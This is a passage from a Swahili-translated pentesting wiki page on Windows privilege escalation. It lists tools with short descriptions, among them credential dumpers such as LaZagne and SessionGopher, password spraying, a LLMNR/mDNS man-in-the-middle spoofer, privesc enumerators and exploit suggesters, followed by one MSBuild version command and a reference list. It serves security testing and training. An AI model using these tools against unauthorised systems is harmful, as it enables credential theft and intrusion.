[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za session zilizohifadhiwa za PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough katika local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa crendentials kutoka Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Tumia passwords zilizokusanywa dhidi ya domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni PowerShell ADIDNS/LLMNR/mDNS spoofer na man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Tafuta known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Tafuta known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Huchunguza host kutafuta misconfigurations (zaidi ni tool ya kukusanya taarifa kuliko privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwenye softwares nyingi (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Angalia misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Angalia possible misconfigurations (exe kutoka python). Not recommended. It does not work well in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool iliyoundwa kulingana na post hii (haihitaji accesschk ili ifanye kazi vizuri lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Husoma output ya **systeminfo** na kupendekeza exploits zinazofanya kazi (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Husoma output ya **systeminfo** na kupendekeza exploits zinazofanya kazi (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Lazima u-compile project kwa kutumia toleo sahihi la .NET ([tazama hili](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililosakinishwa kwenye host ya victim unaweza kufanya:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Marejeo

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Vulnerability ya Mfumo wa Faili Zilizopata Haki za Kipekee ipo katika Mfumo wa SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

{{#include ../../banners/hacktricks-training.md}}
